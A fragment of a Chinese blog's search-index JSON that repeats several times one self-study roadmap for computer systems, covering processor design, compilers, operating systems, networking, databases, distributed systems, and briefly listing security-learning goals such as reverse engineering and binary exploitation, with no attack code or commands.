给系统提安全漏洞补丁 称为计算机系统黑客！ 为我自己的系统（操作系统、硬件、数据库）加安全机制 研究新的安全机制 硬件安全 2.4.9 图形化处理与GPU优化 2.4.10 高性能计算 2.4.11 大数据经典架构 2.4.12 AI推理引擎架构","date":"2024-08-25","objectID":"/roadmap/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B9%8B%E8%B7%AF/:2:4","series":["记录"],"tags":null,"title":"计算机科学之路","uri":"/roadmap/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B9%8B%E8%B7%AF/#数据库系统"},{"categories":null,"content":" 2.4 系统 \u0026 系统安全方向 2.4.1 计算机体系结构 数字电路 Logisim 模拟软件上的数字电路实现 Verilog 语言学习，使用Verilog语言实现各个基础数字电路 用Verilog 实现一个大的数字电路系统，具体参考各个学校的Project 计算机组成原理 Logisim实现 实现单周期的RISC-V/MIPS处理器 实现多周期的RISC-V/MIPS处理器 实现流水线的RISC-V/MIPS处理器 Verilog 实现 实现单周期的RISC-V/MIPS处理器 实现多周期的RISC-V/MIPS处理器 实现流水线的RISC-V/MIPS处理器 计算机体系结构 实现双发射的高效处理器，能够运行Linux操作系统 香山/南湖架构处理器研究，并提开源贡献 造轮子 南大PA完成 一生一芯项目完成 NEMU代码研究，并进行开源贡献，优化NEMU的开源效率 QEMU代码研究，并进行开源贡献，优化QEMU的运行效率 实现一个简单的RISC-V CPU模拟器 强化RISC-V CPU模拟器，使其能够运行Linux操作系统 添加ARM指令集模拟器 强化ARM指令集模拟器，使其能够运行Linux操作系统 添加MIPS指令集模拟器 强化MIIPS指令集模拟器，使其能够运行Linux操作系统 实现三个指令集架构的三合一选择，使其能够运行Linux操作系统 计算机体系结构论文研读并复现 2.4.2 编译原理 \u0026 编程语言 Nand2Tetris SICP 阅读 Scheme版本书籍阅读并完成课后习题 用Scheme实现Scheme解释器，把实现过程记录在博客上 SICP 学习总结完成 Javascript 版本阅读并完成所有习题 Web 前后端开发技能学习 用Javascript实现Web版本的Scheme解释器，把实现过程记录在博客上 SICP Javascript 版本阅读总结完成 SICP 学习经历总结在博客上 Essential of programming languages 阅读 书籍阅读并完成所有习题 用Scheme实现一个解释器 几种汇编语言学习并实现其汇编器 RISC-V 语言学习 RISC-V 汇编器实现 ARM 语言学习 ARM 汇编器实现 MIPS 语言学习 MIPS 汇编器实现 链接工作学习，并实现链接器 《程序员的自我修养》阅读 CSAPP 编译一章阅读 链接器实现 Parsing Techniques 阅读 编译原理课程全部刷完 Stanford CS143 MIT 6.035 各类函数式语言编译器 \u0026 解释器实现 LISP语言学习 LISP解释器实现 Scheme 语言学习 Scheme 语言解释器实现 Common Lisp 语言学习 Common Lisp 解释器实现 ML 语言学习 ML 编译器实现（虎书） Python 解释器实现 OCmal 语言学习 OCmal 解释器实现 Racket 学习 Racket 解释器实现 Haskell 学习 Haskell 解释器实现 面向对象语言编译器研究 \u0026 实现 Stanford Cool语言编译器源码研究 JVM 源码研究 简单的Java虚拟机实现 侯捷《STL源码剖析》阅读 自己实现小型的STL C++子集的编译器实现（cppgm） Rust 语言学习 Rust 语言编译器研究 动态类型语言编译器实现 Javascript 编译器实现 逻辑语言解释器实现 Paradigms of Artificial Intelligence Programming Prolog 语言解释器实现，学习NLP和CV，在其中加入AI功能和数学模型推理功能 人工智能基础学习 NLP 学习 CV 学习 在Prolog语言中加入数据结构、逻辑推理、认知推理、数学推理功能 学习AI底层架构的性能优化，和人工智能模型的优化，以及人工智能编译器的优化 设计AI推理编译器 深度学习编译器 人工智能学习 深度学习学习 计算机图形学学习 图形编译库实现 做出QT那样的图形库 编程语言设计学习 《程序语言之路》 《Essence of compiler》 类型系统学习 JAVA垃圾回收机制学习 底层编译优化学习 多语言编译选择实现 编译器项目源码研究，并进行开源贡献（优化） CPython gcc ANTLR4 Yacc Lex Flex Bison 找到编译器工作 实现JetBrains全家桶那样的编译器 编译原理相关论文研读并复现 Coq 推理学习 2.4.3 系统构建 《深入理解计算机系统》阅读完成 课程刷完 CIS 2400 (upenn.edu) ✅ 2024-12-28 CSAPP - [ ] 重点：Cache Lab（用C优化矩阵转置）+ Proxy Lab（支持并发HTTP请求）。 MIT CSE SJTU CSE 系统原理 造轮子 Shell 实现 Malloc 实现 小型文件系统实现 虚拟内存管理实现 网络编程库实现（如moduo学习），实现自己的Socket套接字 进程通信协议学习实现 2.4.4 操作系统 基础理论学习 \u0026 刷课完成 《操作系统概念》阅读完成 《操作系统设计与实现》阅读完成 THU UCore 实验完成 UCore 源码研究 自己用C语言搓一个小型操作系统，运行在我自己的CPU模拟器上 Rust 资源收集 Rust 基础学习 Rustlings 完成 - [ ] 用Rust重写dllist并添加Benchmark。 - 目标：能熟练用Rust写OS/编译器。 RCore 实验完成 自己用Rust实现一个小型的操作系统，运行QEMU上 MIT 6.081课程学习 - [ ] Lab6: 多线程调度（实现MLFQ）。 - [ ] Lab9: 文件系统（扩展支持符号链接）。 - 输出：GitHub仓库+博客解析。 XV6 Lab完成 XV6 源码研究 优化我自己的C语言操作系统 用Rust重写XV6，运行在QEMU上 优化我自己的Rust操作系统 PintOS Lab完成 PintOS 源码研究 优化我自己的C语言操作系统 PintOS 使用Rust重写，运行在QEMU上 计算机网络学习 为操作系统添加网络协议栈，实现其联网 《Linux内核源码剖析》阅读 Linux Kernel 0.11 源码研究 Linux内核研究，提交开源贡献 开发出带shell和GUI的操作系统，可以在其上打游戏 操作系统顶级会议论文研读并复现 2.4.5 计算机网络 计算机网络课程刷完 用C语言实现一个小型的TCP/IP协议栈 给我自己的操作系统添加一个协议栈，使其联网 对照RFC文档，实现Socket套接字 计算机网络顶级会议论文研读并复现 2.4.6 数据库系统 《数据库系统概念》阅读 《数据库系统实现》阅读 数据库课程刷完 造轮子 小型关系型数据库 KV-Store 数据库 NoSQL 数据库 实现 mysql 协议，支持 mysql 连接 分布式系统学习 为数据库添加实现分布式协议 实现 Web 版本数据库 找到数据库工作 实现支持KV-Store/NoSQL/mysql协议/分布式协议/Web连接/OLTP/OLAP的数据库 2.4.7 并行与分布式系统 MIT 6.824 课程学习完成 实现Raft算法后，优化Leader选举性能（论文《In Search of an Understandable Consensus Algorithm》） C++实现 raftcore 分布式算法 C++实现 Paxos 分布式算法 为数据库添加分布式协议 Tikv talent-plan 学习 Tikv 源码研究，并提一些优化 TIDB talent-plan 学习 TIDB 源码研究，并提一些优化 找到数据库工作 为我自己的数据库加入分布式机制 2.4.8 系统安全 成为逆向工程和 binary hacking/binary exploition, pwn 的大佬 研究操作系统内核安全机制 给系统提安全漏洞补丁 称为计算机系统黑客！ 为我自己的系统（操作系统、硬件、数据库）加安全机制 研究新的安全机制 硬件安全 2.4.9 图形化处理与GPU优化 2.4.10 高性能计算 2.4.11 大数据经典架构 2.4.12 AI推理引擎架构","date":"2024-08-25","objectID":"/roadmap/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B9%8B%E8%B7%AF/:2:4","series":["记录"],"tags":null,"title":"计算机科学之路","uri":"/roadmap/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B9%8B%E8%B7%AF/#并行与分布式系统"},{"categories":null,"content":" 2.4 系统 \u0026 系统安全方向 2.4.1 计算机体系结构 数字电路 Logisim 模拟软件上的数字电路实现 Verilog 语言学习，使用Verilog语言实现各个基础数字电路 用Verilog 实现一个大的数字电路系统，具体参考各个学校的Project 计算机组成原理 Logisim实现 实现单周期的RISC-V/MIPS处理器 实现多周期的RISC-V/MIPS处理器 实现流水线的RISC-V/MIPS处理器 Verilog 实现 实现单周期的RISC-V/MIPS处理器 实现多周期的RISC-V/MIPS处理器 实现流水线的RISC-V/MIPS处理器 计算机体系结构 实现双发射的高效处理器，能够运行Linux操作系统 香山/南湖架构处理器研究，并提开源贡献 造轮子 南大PA完成 一生一芯项目完成 NEMU代码研究，并进行开源贡献，优化NEMU的开源效率 QEMU代码研究，并进行开源贡献，优化QEMU的运行效率 实现一个简单的RISC-V CPU模拟器 强化RISC-V CPU模拟器，使其能够运行Linux操作系统 添加ARM指令集模拟器 强化ARM指令集模拟器，使其能够运行Linux操作系统 添加MIPS指令集模拟器 强化MIIPS指令集模拟器，使其能够运行Linux操作系统 实现三个指令集架构的三合一选择，使其能够运行Linux操作系统 计算机体系结构论文研读并复现 2.4.2 编译原理 \u0026 编程语言 Nand2Tetris SICP 阅读 Scheme版本书籍阅读并完成课后习题 用Scheme实现Scheme解释器，把实现过程记录在博客上 SICP 学习总结完成 Javascript 版本阅读并完成所有习题 Web 前后端开发技能学习 用Javascript实现Web版本的Scheme解释器，把实现过程记录在博客上 SICP Javascript 版本阅读总结完成 SICP 学习经历总结在博客上 Essential of programming languages 阅读 书籍阅读并完成所有习题 用Scheme实现一个解释器 几种汇编语言学习并实现其汇编器 RISC-V 语言学习 RISC-V 汇编器实现 ARM 语言学习 ARM 汇编器实现 MIPS 语言学习 MIPS 汇编器实现 链接工作学习，并实现链接器 《程序员的自我修养》阅读 CSAPP 编译一章阅读 链接器实现 Parsing Techniques 阅读 编译原理课程全部刷完 Stanford CS143 MIT 6.035 各类函数式语言编译器 \u0026 解释器实现 LISP语言学习 LISP解释器实现 Scheme 语言学习 Scheme 语言解释器实现 Common Lisp 语言学习 Common Lisp 解释器实现 ML 语言学习 ML 编译器实现（虎书） Python 解释器实现 OCmal 语言学习 OCmal 解释器实现 Racket 学习 Racket 解释器实现 Haskell 学习 Haskell 解释器实现 面向对象语言编译器研究 \u0026 实现 Stanford Cool语言编译器源码研究 JVM 源码研究 简单的Java虚拟机实现 侯捷《STL源码剖析》阅读 自己实现小型的STL C++子集的编译器实现（cppgm） Rust 语言学习 Rust 语言编译器研究 动态类型语言编译器实现 Javascript 编译器实现 逻辑语言解释器实现 Paradigms of Artificial Intelligence Programming Prolog 语言解释器实现，学习NLP和CV，在其中加入AI功能和数学模型推理功能 人工智能基础学习 NLP 学习 CV 学习 在Prolog语言中加入数据结构、逻辑推理、认知推理、数学推理功能 学习AI底层架构的性能优化，和人工智能模型的优化，以及人工智能编译器的优化 设计AI推理编译器 深度学习编译器 人工智能学习 深度学习学习 计算机图形学学习 图形编译库实现 做出QT那样的图形库 编程语言设计学习 《程序语言之路》 《Essence of compiler》 类型系统学习 JAVA垃圾回收机制学习 底层编译优化学习 多语言编译选择实现 编译器项目源码研究，并进行开源贡献（优化） CPython gcc ANTLR4 Yacc Lex Flex Bison 找到编译器工作 实现JetBrains全家桶那样的编译器 编译原理相关论文研读并复现 Coq 推理学习 2.4.3 系统构建 《深入理解计算机系统》阅读完成 课程刷完 CIS 2400 (upenn.edu) ✅ 2024-12-28 CSAPP - [ ] 重点：Cache Lab（用C优化矩阵转置）+ Proxy Lab（支持并发HTTP请求）。 MIT CSE SJTU CSE 系统原理 造轮子 Shell 实现 Malloc 实现 小型文件系统实现 虚拟内存管理实现 网络编程库实现（如moduo学习），实现自己的Socket套接字 进程通信协议学习实现 2.4.4 操作系统 基础理论学习 \u0026 刷课完成 《操作系统概念》阅读完成 《操作系统设计与实现》阅读完成 THU UCore 实验完成 UCore 源码研究 自己用C语言搓一个小型操作系统，运行在我自己的CPU模拟器上 Rust 资源收集 Rust 基础学习 Rustlings 完成 - [ ] 用Rust重写dllist并添加Benchmark。 - 目标：能熟练用Rust写OS/编译器。 RCore 实验完成 自己用Rust实现一个小型的操作系统，运行QEMU上 MIT 6.081课程学习 - [ ] Lab6: 多线程调度（实现MLFQ）。 - [ ] Lab9: 文件系统（扩展支持符号链接）。 - 输出：GitHub仓库+博客解析。 XV6 Lab完成 XV6 源码研究 优化我自己的C语言操作系统 用Rust重写XV6，运行在QEMU上 优化我自己的Rust操作系统 PintOS Lab完成 PintOS 源码研究 优化我自己的C语言操作系统 PintOS 使用Rust重写，运行在QEMU上 计算机网络学习 为操作系统添加网络协议栈，实现其联网 《Linux内核源码剖析》阅读 Linux Kernel 0.11 源码研究 Linux内核研究，提交开源贡献 开发出带shell和GUI的操作系统，可以在其上打游戏 操作系统顶级会议论文研读并复现 2.4.5 计算机网络 计算机网络课程刷完 用C语言实现一个小型的TCP/IP协议栈 给我自己的操作系统添加一个协议栈，使其联网 对照RFC文档，实现Socket套接字 计算机网络顶级会议论文研读并复现 2.4.6 数据库系统 《数据库系统概念》阅读 《数据库系统实现》阅读 数据库课程刷完 造轮子 小型关系型数据库 KV-Store 数据库 NoSQL 数据库 实现 mysql 协议，支持 mysql 连接 分布式系统学习 为数据库添加实现分布式协议 实现 Web 版本数据库 找到数据库工作 实现支持KV-Store/NoSQL/mysql协议/分布式协议/Web连接/OLTP/OLAP的数据库 2.4.7 并行与分布式系统 MIT 6.824 课程学习完成 实现Raft算法后，优化Leader选举性能（论文《In Search of an Understandable Consensus Algorithm》） C++实现 raftcore 分布式算法 C++实现 Paxos 分布式算法 为数据库添加分布式协议 Tikv talent-plan 学习 Tikv 源码研究，并提一些优化 TIDB talent-plan 学习 TIDB 源码研究，并提一些优化 找到数据库工作 为我自己的数据库加入分布式机制 2.4.8 系统安全 成为逆向工程和 binary hacking/binary exploition, pwn 的大佬 研究操作系统内核安全机制 给系统提安全漏洞补丁 称为计算机系统黑客！ 为我自己的系统（操作系统、硬件、数据库）加安全机制 研究新的安全机制 硬件安全 2.4.9 图形化处理与GPU优化 2.4.10 高性能计算 2.4.11 大数据经典架构 2.4.12 AI推理引擎架构","date":"2024-08-25","objectID":"/roadmap/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B9%8B%E8%B7%AF/:2:4","series":["记录"],"tags":null,"title":"计算机科学之路","uri":"/roadmap/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B9%8B%E8%B7%AF/#系统安全"},{"categories":null,"content":" 2.4 系统 \u0026 系统安全方向 2.4.1 计算机体系结构 数字电路 Logisim 模拟软件上的数字电路实现 Verilog 语言学习，使用Verilog语言实现各个基础数字电路 用Verilog 实现一个大的数字电路系统，具体参考各个学校的Project 计算机组成原理 Logisim实现 实现单周期的RISC-V/MIPS处理器 实现多周期的RISC-V/MIPS处理器 实现流水线的RISC-V/MIPS处理器 Verilog 实现 实现单周期的RISC-V/MIPS处理器 实现多周期的RISC-V/MIPS处理器 实现流水线的RISC-V/MIPS处理器 计算机体系结构 实现双发射的高效处理器，能够运行Linux操作系统 香山/南湖架构处理器研究，并提开源贡献 造轮子 南大PA完成 一生一芯项目完成 NEMU代码研究，并进行开源贡献，优化NEMU的开源效率 QEMU代码研究，并进行开源贡献，优化QEMU的运行效率 实现一个简单的RISC-V CPU模拟器 强化RISC-V CPU模拟器，使其能够运行Linux操作系统 添加ARM指令集模拟器 强化ARM指令集模拟器，使其能够运行Linux操作系统 添加MIPS指令集模拟器 强化MIIPS指令集模拟器，使其能够运行Linux操作系统 实现三个指令集架构的三合一选择，使其能够运行Linux操作系统 计算机体系结构论文研读并复现 2.4.2 编译原理 \u0026 编程语言 Nand2Tetris SICP 阅读 Scheme版本书籍阅读并完成课后习题 用Scheme实现Scheme解释器，把实现过程记录在博客上 SICP 学习总结完成 Javascript 版本阅读并完成所有习题 Web 前后端开发技能学习 用Javascript实现Web版本的Scheme解释器，把实现过程记录在博客上 SICP Javascript 版本阅读总结完成 SICP 学习经历总结在博客上 Essential of programming languages 阅读 书籍阅读并完成所有习题 用Scheme实现一个解释器 几种汇编语言学习并实现其汇编器 RISC-V 语言学习 RISC-V 汇编器实现 ARM 语言学习 ARM 汇编器实现 MIPS 语言学习 MIPS 汇编器实现 链接工作学习，并实现链接器 《程序员的自我修养》阅读 CSAPP 编译一章阅读 链接器实现 Parsing Techniques 阅读 编译原理课程全部刷完 Stanford CS143 MIT 6.035 各类函数式语言编译器 \u0026 解释器实现 LISP语言学习 LISP解释器实现 Scheme 语言学习 Scheme 语言解释器实现 Common Lisp 语言学习 Common Lisp 解释器实现 ML 语言学习 ML 编译器实现（虎书） Python 解释器实现 OCmal 语言学习 OCmal 解释器实现 Racket 学习 Racket 解释器实现 Haskell 学习 Haskell 解释器实现 面向对象语言编译器研究 \u0026 实现 Stanford Cool语言编译器源码研究 JVM 源码研究 简单的Java虚拟机实现 侯捷《STL源码剖析》阅读 自己实现小型的STL C++子集的编译器实现（cppgm） Rust 语言学习 Rust 语言编译器研究 动态类型语言编译器实现 Javascript 编译器实现 逻辑语言解释器实现 Paradigms of Artificial Intelligence Programming Prolog 语言解释器实现，学习NLP和CV，在其中加入AI功能和数学模型推理功能 人工智能基础学习 NLP 学习 CV 学习 在Prolog语言中加入数据结构、逻辑推理、认知推理、数学推理功能 学习AI底层架构的性能优化，和人工智能模型的优化，以及人工智能编译器的优化 设计AI推理编译器 深度学习编译器 人工智能学习 深度学习学习 计算机图形学学习 图形编译库实现 做出QT那样的图形库 编程语言设计学习 《程序语言之路》 《Essence of compiler》 类型系统学习 JAVA垃圾回收机制学习 底层编译优化学习 多语言编译选择实现 编译器项目源码研究，并进行开源贡献（优化） CPython gcc ANTLR4 Yacc Lex Flex Bison 找到编译器工作 实现JetBrains全家桶那样的编译器 编译原理相关论文研读并复现 Coq 推理学习 2.4.3 系统构建 《深入理解计算机系统》阅读完成 课程刷完 CIS 2400 (upenn.edu) ✅ 2024-12-28 CSAPP - [ ] 重点：Cache Lab（用C优化矩阵转置）+ Proxy Lab（支持并发HTTP请求）。 MIT CSE SJTU CSE 系统原理 造轮子 Shell 实现 Malloc 实现 小型文件系统实现 虚拟内存管理实现 网络编程库实现（如moduo学习），实现自己的Socket套接字 进程通信协议学习实现 2.4.4 操作系统 基础理论学习 \u0026 刷课完成 《操作系统概念》阅读完成 《操作系统设计与实现》阅读完成 THU UCore 实验完成 UCore 源码研究 自己用C语言搓一个小型操作系统，运行在我自己的CPU模拟器上 Rust 资源收集 Rust 基础学习 Rustlings 完成 - [ ] 用Rust重写dllist并添加Benchmark。 - 目标：能熟练用Rust写OS/编译器。 RCore 实验完成 自己用Rust实现一个小型的操作系统，运行QEMU上 MIT 6.081课程学习 - [ ] Lab6: 多线程调度（实现MLFQ）。 - [ ] Lab9: 文件系统（扩展支持符号链接）。 - 输出：GitHub仓库+博客解析。 XV6 Lab完成 XV6 源码研究 优化我自己的C语言操作系统 用Rust重写XV6，运行在QEMU上 优化我自己的Rust操作系统 PintOS Lab完成 PintOS 源码研究 优化我自己的C语言操作系统 PintOS 使用Rust重写，运行在QEMU上 计算机网络学习 为操作系统添加网络协议栈，实现其联网 《Linux内核源码剖析》阅读 Linux Kernel 0.11 源码研究 Linux内核研究，提交开源贡献 开发出带shell和GUI的操作系统，可以在其上打游戏 操作系统顶级会议论文研读并复现 2.4.5 计算机网络 计算机网络课程刷完 用C语言实现一个小型的TCP/IP协议栈 给我自己的操作系统添加一个协议栈，使其联网 对照RFC文档，实现Socket套接字 计算机网络顶级会议论文研读并复现 2.4.6 数据库系统 《数据库系统概念》阅读 《数据库系统实现》阅读 数据库课程刷完 造轮子 小型关系型数据库 KV-Store 数据库 NoSQL 数据库 实现 mysql 协议，支持 mysql 连接 分布式系统学习 为数据库添加实现分布式协议 实现 Web 版本数据库 找到数据库工作 实现支持KV-Store/NoSQL/mysql协议/分布式协议/Web连接/OLTP/OLAP的数据库 2.4.7 并行与分布式系统 MIT 6.824 课程学习完成 实现Raft算法后，优化Leader选举性能（论文《In Search of an Understandable Consensus Algorithm》） C++实现 raftcore 分布式算法 C++实现 Paxos 分布式算法 为数据库添加分布式协议 Tikv talent-plan 学习 Tikv 源码研究，并提一些优化 TIDB talent-plan 学习 TIDB 源码研究，并提一些优化 找到数据库工作 为我自己的数据库加入分布式机制 2.4.8 系统安全 成为逆向工程和 binary hacking/binary exploition, pwn 的大佬 研究操作系统内核安全机制 给系统提安全漏洞补丁 称为计算机系统黑客！ 为我自己的系统（操作系统、硬件、数据库）加安全机制 研究新的安全机制 硬件安全 2.4.9 图形化处理与GPU优化 2.4.10 高性能计算 2.4.11 大数据经典架构 2.4.12 AI推理引擎架构","date":"2024-08-25","objectID":"/roadmap/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B9%8B%E8%B7%AF/:2:4","series":["记录"],"tags":null,"title":"计算机科学之路","uri":"/roadmap/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B9%8B%E8%B7%AF/#图形化处理与gpu优化"},{"categories":null,"content":" 2.4 系统 \u0026 系统安全方向 2.4.1 计算机体系结构 数字电路 Logisim 模拟软件上的数字电路实现 Verilog 语言学习，使用Verilog语言实现各个基础数字电路 用Verilog 实现一个大的数字电路系统，具体参考各个学校的Project 计算机组成原理 Logisim实现 实现单周期的RISC-V/MIPS处理器 实现多周期的RISC-V/MIPS处理器 实现流水线的RISC-V/MIPS处理器 Verilog 实现 实现单周期的RISC-V/MIPS处理器 实现多周期的RISC-V/MIPS处理器 实现流水线的RISC-V/MIPS处理器 计算机体系结构 实现双发射的高效处理器，能够运行Linux操作系统 香山/南湖架构处理器研究，并提开源贡献 造轮子 南大PA完成 一生一芯项目完成 NEMU代码研究，并进行开源贡献，优化NEMU的开源效率 QEMU代码研究，并进行开源贡献，优化QEMU的运行效率 实现一个简单的RISC-V CPU模拟器 强化RISC-V CPU模拟器，使其能够运行Linux操作系统 添加ARM指令集模拟器 强化ARM指令集模拟器，使其能够运行Linux操作系统 添加MIPS指令集模拟器 强化MIIPS指令集模拟器，使其能够运行Linux操作系统 实现三个指令集架构的三合一选择，使其能够运行Linux操作系统 计算机体系结构论文研读并复现 2.4.2 编译原理 \u0026 编程语言 Nand2Tetris SICP 阅读 Scheme版本书籍阅读并完成课后习题 用Scheme实现Scheme解释器，把实现过程记录在博客上 SICP 学习总结完成 Javascript 版本阅读并完成所有习题 Web 前后端开发技能学习 用Javascript实现Web版本的Scheme解释器，把实现过程记录在博客上 SICP Javascript 版本阅读总结完成 SICP 学习经历总结在博客上 Essential of programming languages 阅读 书籍阅读并完成所有习题 用Scheme实现一个解释器 几种汇编语言学习并实现其汇编器 RISC-V 语言学习 RISC-V 汇编器实现 ARM 语言学习 ARM 汇编器实现 MIPS 语言学习 MIPS 汇编器实现 链接工作学习，并实现链接器 《程序员的自我修养》阅读 CSAPP 编译一章阅读 链接器实现 Parsing Techniques 阅读 编译原理课程全部刷完 Stanford CS143 MIT 6.035 各类函数式语言编译器 \u0026 解释器实现 LISP语言学习 LISP解释器实现 Scheme 语言学习 Scheme 语言解释器实现 Common Lisp 语言学习 Common Lisp 解释器实现 ML 语言学习 ML 编译器实现（虎书） Python 解释器实现 OCmal 语言学习 OCmal 解释器实现 Racket 学习 Racket 解释器实现 Haskell 学习 Haskell 解释器实现 面向对象语言编译器研究 \u0026 实现 Stanford Cool语言编译器源码研究 JVM 源码研究 简单的Java虚拟机实现 侯捷《STL源码剖析》阅读 自己实现小型的STL C++子集的编译器实现（cppgm） Rust 语言学习 Rust 语言编译器研究 动态类型语言编译器实现 Javascript 编译器实现 逻辑语言解释器实现 Paradigms of Artificial Intelligence Programming Prolog 语言解释器实现，学习NLP和CV，在其中加入AI功能和数学模型推理功能 人工智能基础学习 NLP 学习 CV 学习 在Prolog语言中加入数据结构、逻辑推理、认知推理、数学推理功能 学习AI底层架构的性能优化，和人工智能模型的优化，以及人工智能编译器的优化 设计AI推理编译器 深度学习编译器 人工智能学习 深度学习学习 计算机图形学学习 图形编译库实现 做出QT那样的图形库 编程语言设计学习 《程序语言之路》 《Essence of compiler》 类型系统学习 JAVA垃圾回收机制学习 底层编译优化学习 多语言编译选择实现 编译器项目源码研究，并进行开源贡献（优化） CPython gcc ANTLR4 Yacc Lex Flex Bison 找到编译器工作 实现JetBrains全家桶那样的编译器 编译原理相关论文研读并复现 Coq 推理学习 2.4.3 系统构建 《深入理解计算机系统》阅读完成 课程刷完 CIS 2400 (upenn.edu) ✅ 2024-12-28 CSAPP - [ ] 重点：Cache Lab（用C优化矩阵转置）+ Proxy Lab（支持并发HTTP请求）。 MIT CSE SJTU CSE 系统原理 造轮子 Shell 实现 Malloc 实现 小型文件系统实现 虚拟内存管理实现 网络编程库实现（如moduo学习），实现自己的Socket套接字 进程通信协议学习实现 2.4.4 操作系统 基础理论学习 \u0026 刷课完成 《操作系统概念》阅读完成 《操作系统设计与实现》阅读完成 THU UCore 实验完成 UCore 源码研究 自己用C语言搓一个小型操作系统，运行在我自己的CPU模拟器上 Rust 资源收集 Rust 基础学习 Rustlings 完成 - [ ] 用Rust重写dllist并添加Benchmark。 - 目标：能熟练用Rust写OS/编译器。 RCore 实验完成 自己用Rust实现一个小型的操作系统，运行QEMU上 MIT 6.081课程学习 - [ ] Lab6: 多线程调度（实现MLFQ）。 - [ ] Lab9: 文件系统（扩展支持符号链接）。 - 输出：GitHub仓库+博客解析。 XV6 Lab完成 XV6 源码研究 优化我自己的C语言操作系统 用Rust重写XV6，运行在QEMU上 优化我自己的Rust操作系统 PintOS Lab完成 PintOS 源码研究 优化我自己的C语言操作系统 PintOS 使用Rust重写，运行在QEMU上 计算机网络学习 为操作系统添加网络协议栈，实现其联网 《Linux内核源码剖析》阅读 Linux Kernel 0.11 源码研究 Linux内核研究，提交开源贡献 开发出带shell和GUI的操作系统，可以在其上打游戏 操作系统顶级会议论文研读并复现 2.4.5 计算机网络 计算机网络课程刷完 用C语言实现一个小型的TCP/IP协议栈 给我自己的操作系统添加一个协议栈，使其联网 对照RFC文档，实现Socket套接字 计算机网络顶级会议论文研读并复现 2.4.6 数据库系统 《数据库系统概念》阅读 《数据库系统实现》阅读 数据库课程刷完 造轮子 小型关系型数据库 KV-Store 数据库 NoSQL 数据库 实现 mysql 协议，支持 mysql 连接 分布式系统学习 为数据库添加实现分布式协议 实现 Web 版本数据库 找到数据库工作 实现支持KV-Store/NoSQL/mysql协议/分布式协议/Web连接/OLTP/OLAP的数据库 2.4.7 并行与分布式系统 MIT 6.824 课程学习完成 实现Raft算法后，优化Leader选举性能（论文《In Search of an Understandable Consensus Algorithm》） C++实现 raftcore 分布式算法 C++实现 Paxos 分布式算法 为数据库添加分布式协议 Tikv talent-plan 学习 Tikv 源码研究，并提一些优化 TIDB talent-plan 学习 TIDB 源码研究，并提一些优化 找到数据库工作 为我自己的数据库加入分布式机制 2.4.8 系统安全 成为逆向工程和 binary hacking/binary exploition, pwn 的大佬 研究操作系统内核安全机制 给系统提安全漏洞补丁 称为计算机系统黑客！ 为我自己的系统（操作系统、硬件、数据库）加安全机制 研究新的安全机制 硬件安全 2.4.9 图形化处理与GPU优化 2.4.10 高性能计算 2.4.11 大数据经典架构 2.4.12 AI推理引擎架构","date":"2024-08-25","objectID":"/roadmap/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B9%8B%E8%B7%AF/:2:4","series":["记录"],"tags":null,"title":"计算机科学之路","uri":"/roadmap/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B9%8B%E8%B7%AF/#高性能计算"},{"categories":null,"content":" 2.4 系统 \u0026 系统安全方向 2.4.1 计算机体系结构 数字电路 Logisim 模拟软件上的数字电路实现 Verilog 语言学习，使用Verilog语言实现各个基础数字电路 用Verilog 实现一个大的数字电路系统，具体参考各个学校的Project 计算机组成原理 Logisim实现 实现单周期的RISC-V/MIPS处理器 实现多周期的RISC-V/MIPS处理器 实现流水线的RISC-V/MIPS处理器 Verilog 实现 实现单周期的RISC-V/MIPS处理器 实现多周期的RISC-V/MIPS处理器 实现流水线的RISC-V/MIPS处理器 计算机体系结构 实现双发射的高效处理器，能够运行Linux操作系统 香山/南湖架构处理器研究，并提开源贡献 造轮子 南大PA完成 一生一芯项目完成 NEMU代码研究，并进行开源贡献，优化NEMU的开源效率 QEMU代码研究，并进行开源贡献，优化QEMU的运行效率 实现一个简单的RISC-V CPU模拟器 强化RISC-V CPU模拟器，使其能够运行Linux操作系统 添加ARM指令集模拟器 强化ARM指令集模拟器，使其能够运行Linux操作系统 添加MIPS指令集模拟器 强化MIIPS指令集模拟器，使其能够运行Linux操作系统 实现三个指令集架构的三合一选择，使其能够运行Linux操作系统 计算机体系结构论文研读并复现 2.4.2 编译原理 \u0026 编程语言 Nand2Tetris SICP 阅读 Scheme版本书籍阅读并完成课后习题 用Scheme实现Scheme解释器，把实现过程记录在博客上 SICP 学习总结完成 Javascript 版本阅读并完成所有习题 Web 前后端开发技能学习 用Javascript实现Web版本的Scheme解释器，把实现过程记录在博客上 SICP Javascript 版本阅读总结完成 SICP 学习经历总结在博客上 Essential of programming languages 阅读 书籍阅读并完成所有习题 用Scheme实现一个解释器 几种汇编语言学习并实现其汇编器 RISC-V 语言学习 RISC-V 汇编器实现 ARM 语言学习 ARM 汇编器实现 MIPS 语言学习 MIPS 汇编器实现 链接工作学习，并实现链接器 《程序员的自我修养》阅读 CSAPP 编译一章阅读 链接器实现 Parsing Techniques 阅读 编译原理课程全部刷完 Stanford CS143 MIT 6.035 各类函数式语言编译器 \u0026 解释器实现 LISP语言学习 LISP解释器实现 Scheme 语言学习 Scheme 语言解释器实现 Common Lisp 语言学习 Common Lisp 解释器实现 ML 语言学习 ML 编译器实现（虎书） Python 解释器实现 OCmal 语言学习 OCmal 解释器实现 Racket 学习 Racket 解释器实现 Haskell 学习 Haskell 解释器实现 面向对象语言编译器研究 \u0026 实现 Stanford Cool语言编译器源码研究 JVM 源码研究 简单的Java虚拟机实现 侯捷《STL源码剖析》阅读 自己实现小型的STL C++子集的编译器实现（cppgm） Rust 语言学习 Rust 语言编译器研究 动态类型语言编译器实现 Javascript 编译器实现 逻辑语言解释器实现 Paradigms of Artificial Intelligence Programming 